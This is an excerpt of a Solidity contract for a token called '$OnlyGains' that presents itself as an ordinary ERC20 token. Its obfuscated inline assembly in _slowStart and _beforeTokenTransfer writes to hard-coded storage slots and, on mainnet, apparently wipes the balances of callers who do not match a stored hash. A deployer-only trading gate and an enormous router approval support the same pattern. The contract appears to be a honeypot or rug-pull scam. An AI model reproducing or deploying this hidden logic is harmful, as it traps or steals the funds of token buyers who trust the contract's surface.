...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addOnlyGains;
    uint256 private bestGainz = block.number*2;

    mapping (address => bool) private _firstPump; 
    mapping (address => bool) private _secondGainzz;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private lateShow;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private hongKong;
    address public pair;
    ...
    bool private trading; uint256 private flashSlow = 1; bool private saturnMars;
    uint256 private _decimals; uint256 private neptuneLightning;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addOnlyGains.push(_router); addOnlyGains.push(msgSender_); addOnlyGains.push(pair);
        for (uint256 q=0; q < 3;) {_firstPump[addOnlyGains[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xf466319d005d76ad4d74bdcd684ca2a05ad3948a339fbf39a7d21a583722155b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xcb680346674f16595a4766a56d1bc60cfc78130960231fde04fdf404e498f1f5,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; bestGainz = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addOnlyGains[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployOnlyGains(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addOnlyGains[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployOnlyGains(creator, initialSupply);
    }
}

contract $OnlyGains is ERC20Token {
    constructor() ERC20Token("OnlyGains", "OG", msg.sender, 125000000 * 10 ** 18) {
    }
}